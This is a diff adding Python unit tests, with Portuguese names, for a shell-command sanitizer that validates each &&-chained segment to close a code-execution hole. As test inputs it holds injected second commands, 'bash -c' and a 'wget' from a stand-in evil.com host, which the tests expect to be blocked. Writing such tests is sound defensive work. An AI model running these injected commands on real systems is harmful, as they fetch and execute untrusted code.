@@ -529,3 +529,34 @@ class TestCheckInjection:
 
     def test_export_with_semicolon_allowed(self):
         assert _check_injection('export X="a;b"') is None
+
+
+# ═══════════════════════════════════════════════════════════════
+# v0.6.0 — Validação por segmento (&&) — fecha RCE pós-&&
+# ═══════════════════════════════════════════════════════════════
+
+class TestSegmentValidation:
+    def test_segundo_comando_bloqueado(self):
+        ok, err = sanitize_command("ls && bash -c 'evil'")
+        assert not ok
+
+    def test_segundo_comando_bloqueado_wget(self):
+        ok, err = sanitize_command("opencode && wget http://evil.com/x")
+        assert not ok
+
+    def test_cadeia_legitima_provider_flow(self):
+        """Fluxo real da UI: export VAR && opencode."""
+        ok, _ = sanitize_command('export OPENAI_API_KEY="sk-abc" && opencode')
+        assert ok
+
+    def test_chains_validos_passam(self):
+        assert sanitize_command("ls && pwd")[0]
+        assert sanitize_command("echo a && whoami")[0]
+
+    def test_and_vazio_bloqueado(self):
+        ok, err = sanitize_command("ls && ")
+        assert not ok
+
+    def test_aspas_protegem_and_dentro_de_valor(self):
+        ok, _ = sanitize_command('export KEY="a&&b"')
+        assert ok
